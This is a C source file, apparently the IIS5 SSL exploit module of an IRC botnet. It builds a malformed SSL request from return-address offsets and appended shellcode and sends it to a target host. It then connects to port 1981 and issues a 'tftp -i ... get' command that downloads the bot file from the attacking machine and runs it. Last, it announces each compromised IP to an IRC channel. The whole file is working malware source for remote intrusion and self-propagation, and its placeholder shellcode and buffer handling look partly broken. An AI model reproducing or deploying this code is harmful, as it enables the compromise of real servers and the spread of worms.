#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_IIS5SSL

#define jumper					"\xeb\x0f"
#define bind_shell_code			"\x4E\x49\x4C\x53\x49\x53\x47\x41\x59\x21\x21"

extern char shellcode[];

BOOL IIS5SSL(EXINFO exinfo)
{
	char buffer[IRCLINE];
	char request[]="\x80\x62\x01\x02\xbd\x00\x01\x00\x01\x00\x16\x8f\x82\x01\x00\x00\x00";

	unsigned long XOR=0xffffffff;
	unsigned long offsets[] = {	
		0x6741a1cd,		
		0x6741a199,		
		0x6741a426,		
		0x67419e1d,		
		0x67419ce8,		
		0x0ffb7de9,		
		0x0ffb832f		
	};

	BOOL bRet = FALSE;

	unsigned char *badbuffer=(unsigned char*)malloc(347); 
	memset(badbuffer, 0, 347);
	unsigned char *p=badbuffer; 
	memcpy(p, request, sizeof(request));
	p+=sizeof(request)-1; 
	strcat((char*)p, jumper);
	strcat((char*)p, bind_shell_code);

	SOCKET sSock;
	if((sSock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) != INVALID_SOCKET) {
		SOCKADDR_IN ssin;

		for (int i=0; i < (sizeof(offsets) / sizeof(LPTSTR)); i++) {
			memset(&ssin, 0, sizeof(ssin));
			ssin.sin_family = AF_INET;
			ssin.sin_addr.s_addr = finet_addr(exinfo.ip);
			ssin.sin_port = fhtons(exinfo.port);

			if(fconnect(sSock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
				offsets[i]^=XOR; 
				strncat((char*)p, (char*)&offsets[i], 4);
				strcat((char*)p, shellcode);

				if (fsend(sSock, (char *)&badbuffer, strlen((char *)&badbuffer), 0)) { 
					Sleep(1000); 
					fclosesocket(sSock);
			
					memset(&ssin, 0, sizeof(ssin));
					ssin.sin_family = AF_INET;
					ssin.sin_addr.s_addr = finet_addr(exinfo.ip);
					ssin.sin_port = fhtons(1981);

					if(fconnect(sSock, (LPSOCKADDR)&ssin, sizeof(ssin))) {
						char cmd_buff[400];
						_snprintf(cmd_buff,sizeof(cmd_buff),
							"tftp -i %s get %s\n"
							"%s\n",
							GetIP(exinfo.sock),filename, filename);
							
						if(frecv(exinfo.sock, buffer, sizeof(buffer), 0) > 0) {
							Sleep(5000);

							if(fsend(sSock,(char*)cmd_buff, strlen(cmd_buff),0) > 0) {
								fclosesocket(sSock);

								bRet = TRUE;
								_snprintf(buffer, sizeof(buffer), ".::[%s]::. 0wning IP: %s.", exploit[exinfo.exploit].name, exinfo.ip);
								if (!exinfo.silent) irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);
								addlog(buffer);

								break;
							}
						}
					}
				}
			}
			fclosesocket(sSock);
		}
	}

	return (bRet);
}
#endif
